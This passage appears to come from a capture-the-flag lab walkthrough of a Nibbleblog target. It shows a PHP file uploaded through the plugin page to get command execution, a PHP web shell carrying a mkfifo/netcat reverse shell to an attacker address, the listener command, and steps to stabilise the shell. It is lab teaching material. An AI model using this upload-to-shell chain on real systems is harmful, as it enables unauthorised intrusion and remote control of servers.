- Use the following PHP Code to upload to the Plugin page and see if the command will execute

```php
<?php system('id'); ?>
```

- After the files have uploaded, we must verify the location
- Files were uploaded to 10.129.177.105/nibbleblog/content/private/plugins/my_image/
	- db.xml
	- image.php
- Clicking on the image.php file will execute the *id* command, validating our test was successful
- Now we repeat the same process but with a reverse shell bash one liner and listen for the connection on our machine

**shell.php**
```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.53 8080 >/tmp/f"); ?>
```

**on our machine**
```
nc -nvlp 8080
```

When you get your shell, you may be in a limited environment
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**The Below Two Steps will Stabilize your Shell**
```
echo 'export TERM=xterm-256color' >> ~/.bashrc
```

```
source ~/.bashrc
```
